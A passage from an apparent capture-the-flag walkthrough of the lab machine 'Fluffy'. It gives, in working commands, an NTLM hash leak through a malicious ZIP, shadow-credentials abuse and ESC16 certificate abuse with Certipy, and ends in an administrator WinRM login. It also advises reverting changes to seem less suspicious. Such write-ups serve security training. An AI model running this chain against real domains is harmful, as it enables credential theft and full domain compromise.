Let’s start exploiting it.

After following the steps in the PoC:
- Loaded the Metasploit module
- Set the attacker IP, filename, library name, and SMB share
- Ran the module and generated the malicious ZIP file ```(exploit.zip)```

Once the victim extracts the ZIP, Windows Explorer automatically processes the embedded ```.library-ms``` file. This triggers a connection attempt to the attacker's SMB server, resulting in NTLMv2 hash leakage.

You should see an output similar to the following:
![exploit](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252F9PJS7vnaCDkjdUxNUFbX%252FScreenshot%2520From%25202025-07-21%252004-06-39.png%3Falt%3Dmedia%26token%3D3b0c5fc8-8efe-4144-a186-10f94fd7b702&width=768&dpr=4&quality=100&sign=8ad495af&sv=2)

## Shadow Credentials → $User 

> **Notice:** The old tool certipy-ad is outdated, so I used the updated and maintained Certipy tool instead [Certipy] (https://github.com/ly4k/Certipy) don't mix between them

```shell
certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'WINRM_SVC' auto
```
![Certipy](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FpZSFWengHFPG9lJl0gBq%252Fimage.png%3Falt%3Dmedia%26token%3Dfdb6141b-4c81-477c-a741-1d1a2ae7b14b&width=400&dpr=3&quality=100&sign=b757e698&sv=2)

The ```KRB_AP_ERR_SKEW``` error occurs because your machine’s clock is out of sync with the Domain Controller ```10.10.11.69```, breaking Kerberos authentication for the Shadow Credentials attack. Fix it by syncing time with ```sudo ntpdate 10.10.11.69```

> **Notice:** Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)
It means your machine's clock is out of sync with the domain controller and Kerberos hates that.
Fix it with:

```shell
systemctl stop systemd-timesyncd
sudo ntpdate 10.10.11.69
``` 

This stops the system time service and manually syncs your clock with the DC (10.10.11.69), so you can get Kerberos tickets properly again.
![Certipy2](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252Fb7k1dRT1LZhqk1v5ox7c%252Fimage.png%3Falt%3Dmedia%26token%3Dfbd489c7-12ad-420e-9dde-e1bda8970d65&width=768&dpr=4&quality=100&sign=540fc9cc&sv=2)

When using tools like ``` bloodyAD```  or ``` Certipy```  for Active Directory attacks, the session or authentication token used for actions like group addition may expire or become invalid during a delay. This can cause the attack to fail if group membership hasn’t fully propagated across domain controllers. Re-authentication may be required to ensure permissions are active before proceeding.

## ESC16 → #Root

We tried enumerating certificate vulnerabilities. 
The user ```p.agila``` lacked permissions, but the privileged account ```CA_SVC``` succeeded.
```shell
certipy find -vulnerable -u CA_SVC -hashes :<hash> -dc-ip 10.10.11.69
``` 
![Certipy4](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FPiAcQaw27eZrWtQVPFVI%252Fimage.png%3Falt%3Dmedia%26token%3D09eca56c-6c73-49a6-b67f-490f837a9403&width=400&dpr=3&quality=100&sign=c6c0211a&sv=2)
We discovered the ESC16 vulnerability. Only accounts like CA_SVC can find such issues due to higher privileges.
![Certipy5](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FKAcc4RBML1iEtQHB5I6G%252FScreenshot%25202025-07-24%2520122729.png%3Falt%3Dmedia%26token%3D83e1d92e-6ebd-452a-997c-e467eed8bed9&width=400&dpr=3&quality=100&sign=bfad1b65&sv=2)

First, I changed the login name (UPN) of the ```ca_svc``` account to look like ```administrator```. that make system into thinking ca_svc is the administrator
```shell
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'administrator' -user 'ca_svc' update
``` 
Next, I used ```certipy shadow``` to inject a fake login certificate into the ```ca_svc``` account. Since the name was changed to ```administrator```, the certificate will now be created for the admin account.
```shell
certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto
``` 
![Certipy6](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FWcQEW6RNKK6NhPPY66xf%252Fimage.png%3Falt%3Dmedia%26token%3Da3bd4045-a353-43c8-b66a-a796a953dd1b&width=400&dpr=3&quality=100&sign=52ef4a45&sv=2)
By doing this, I became ```administrator``` on the domain.
```shell
certipy req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
``` 
Now that ca_svc is using the name ```administrator```, we ask the Certificate Authority (CA) to give us a certificate for that user.
```shell
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
``` 
We restore the UPN of ```ca_svc``` to its original value after the attack to avoid breaking any services or scripts that rely on that account. Leaving it as ```administrator``` could cause problems or trigger alerts, so changing it back keeps everything stable and less suspicious.
```shell
certipy auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
``` 
![last2](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252Fm55jqL0BhkEFfbSSp6gI%252Fimage.png%3Falt%3Dmedia%26token%3Daf772335-1a09-4a83-99e6-703808842a81&width=400&dpr=3&quality=100&sign=ae3d5c7f&sv=2)
Now we can authenticate (log in) as the real administrator using the ```.pfx``` certificate we got earlier:
```shell
evil-winrm -i 10.10.11.69 -u administrator -H <hash>
```
